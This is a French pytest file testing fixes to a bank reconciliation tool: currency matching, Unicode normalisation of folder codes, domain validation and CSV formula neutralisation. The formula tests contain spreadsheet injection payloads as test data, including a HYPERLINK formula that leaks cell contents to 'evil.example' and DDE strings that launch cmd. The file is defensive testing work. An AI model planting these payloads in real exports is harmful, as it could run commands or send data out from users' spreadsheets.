"""Corrections issues de la revue adversariale, dans les modules du chef de projet.

Chaque test correspond a un defaut reel trouve par un reviewer independant :
devise ignoree par le moteur, formules de tableur dans les CSV, codes dossier
en forme Unicode decomposee, domaines declares.
"""

from __future__ import annotations

import csv
import datetime as dt
import sys
import unicodedata
from decimal import Decimal
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "src"))

from rapprochement.modeles import OperationBancaire, Piece, Rapprochement, Sens, Statut  # noqa: E402
from rapprochement.moteur import Moteur  # noqa: E402
from rapprochement.parseurs import ErreurFormat, lire_dossiers, lire_pieces, lire_releve  # noqa: E402
from rapprochement.rapport import ecrire_suivi, ligne_sure, neutraliser_formule  # noqa: E402


# ---------------------------------------------------------------- devise


def _operation(devise: str) -> OperationBancaire:
    return OperationBancaire(
        reference="R1", dossier="D1", date_operation=dt.date(2026, 4, 12),
        libelle="PRLV SEPA ORANGE FRANCE", montant=Decimal("100.00"),
        sens=Sens.DEBIT, devise=devise,
    )


def _piece(devise: str) -> Piece:
    return Piece(
        id_piece="P1", dossier="D1", fichier="orange.pdf", fournisseur="Orange France",
        date_facture=dt.date(2026, 4, 10), montant_ttc=Decimal("100.00"), devise=devise,
    )


def test_une_facture_dans_une_autre_devise_ne_justifie_pas_l_operation():
    resultat = Moteur().rapprocher([_operation("USD")], [_piece("EUR")])[0]
    assert resultat.statut is Statut.MANQUANT, (
        "100 USD ne sont pas justifies par une facture de 100 EUR : la vraie "
        "piece ne serait jamais reclamee"
    )


def test_meme_devise_justifie_toujours():
    for devise in ("EUR", "USD"):
        resultat = Moteur().rapprocher([_operation(devise)], [_piece(devise)])[0]
        assert resultat.statut is Statut.JUSTIFIE


# ---------------------------------------------------------------- formules CSV


@pytest.mark.parametrize(
    "dangereux",
    [
        "=HYPERLINK(\"http://evil.example/?x=\"&A1,\"clic\")",
        "+cmd|' /C calc'!A0",
        "-2+3+cmd|' /C calc'!A0",
        "@SUM(1+1)*cmd|' /C calc'!A0",
        "\t=1+1",
        "\r=1+1",
    ],
)
def test_une_formule_est_neutralisee(dangereux):
    assert neutraliser_formule(dangereux) == "'" + dangereux


@pytest.mark.parametrize("sur", ["ORANGE FRANCE", "", "89.90", "-12.50", "+3", "12,5", "a=b", "café"])
def test_un_texte_normal_ou_un_nombre_reste_intact(sur):
    assert neutraliser_formule(sur) == sur


def test_ligne_sure_ne_touche_que_le_texte():
    assert ligne_sure(["=1+1", 5, Decimal("-1"), None, "ok"]) == ["'=1+1", 5, Decimal("-1"), None, "ok"]


def test_le_tableau_de_suivi_neutralise_les_libelles_dangereux(tmp_path):
    operation = OperationBancaire(
        reference="R1", dossier="D1", date_operation=dt.date(2026, 4, 12),
        libelle="=HYPERLINK(\"http://evil.example\")", montant=Decimal("10.00"),
        sens=Sens.DEBIT,
    )
    chemin = ecrire_suivi(
        [Rapprochement(operation=operation, statut=Statut.MANQUANT, motif="+cmd", regle="aucun_candidat")],
        tmp_path / "suivi.csv",
    )
    ligne = next(csv.DictReader(open(chemin, newline="", encoding="utf-8")))
    assert ligne["libelle"].startswith("'=")
    assert ligne["motif"].startswith("'+")
    assert ligne["montant"] == "10.00"


# ---------------------------------------------------------------- NFC


def test_code_dossier_decompose_equivaut_au_code_compose(tmp_path):
    compose = "HÉLOISE-BTP"
    decompose = unicodedata.normalize("NFD", compose)
    assert compose != decompose

    releve = tmp_path / "releve.csv"
    releve.write_text(
        "dossier,date_operation,libelle,debit,credit,reference\n"
        f"{decompose},2026-04-12,PRLV ORANGE,89.90,,R1\n",
        encoding="utf-8",
    )
    pieces = tmp_path / "pieces.csv"
    pieces.write_text(
        "id_piece,dossier,fournisseur,date_facture,montant_ttc\n"
        f"P1,{compose},Orange France,2026-04-10,89.90\n",
        encoding="utf-8",
    )
    dossiers = tmp_path / "dossiers.csv"
    dossiers.write_text(
        "dossier,raison_sociale,email_contact\n" f"{decompose},Heloise BTP,c@heloise.fr\n",
        encoding="utf-8",
    )
    assert lire_releve(releve)[0].dossier == compose
    assert lire_pieces(pieces)[0].dossier == compose
    assert list(lire_dossiers(dossiers)) == [compose]


# ---------------------------------------------------------------- domaines declares


def _dossiers(tmp_path, domaines: str) -> dict:
    chemin = tmp_path / "dossiers.csv"
    chemin.write_text(
        "dossier,raison_sociale,email_contact,domaines\n"
        f'D1,Martin SARL,compta@martin.fr,"{domaines}"\n',
        encoding="utf-8",
    )
    return lire_dossiers(chemin)


def test_domaines_declares_lus_normalises(tmp_path):
    assert _dossiers(tmp_path, " Martin-BTP.fr ; martin.fr ")["D1"].domaines == (
        "martin-btp.fr",
        "martin.fr",
    )


def test_aucun_domaine_par_defaut(tmp_path):
    assert _dossiers(tmp_path, "")["D1"].domaines == ()


@pytest.mark.parametrize("invalide", ["pirate@martin.fr", "martin", "mar tin.fr"])
def test_domaine_invalide_refuse_avec_un_message_clair(tmp_path, invalide):
    with pytest.raises(ErreurFormat, match="domaine"):
        _dossiers(tmp_path, invalide)


@pytest.mark.parametrize("non_ascii", ["stra\u00dfe.de", "caf\u00e9.fr", "\u043f\u0440\u0438\u043c\u0435\u0440.ru"])
def test_domaine_non_ascii_refuse_avec_la_forme_a_declarer(tmp_path, non_ascii):
    with pytest.raises(ErreurFormat, match="punycode"):
        _dossiers(tmp_path, non_ascii)


def test_domaine_punycode_accepte(tmp_path):
    assert _dossiers(tmp_path, "xn--strae-oqa.de")["D1"].domaines == ("xn--strae-oqa.de",)

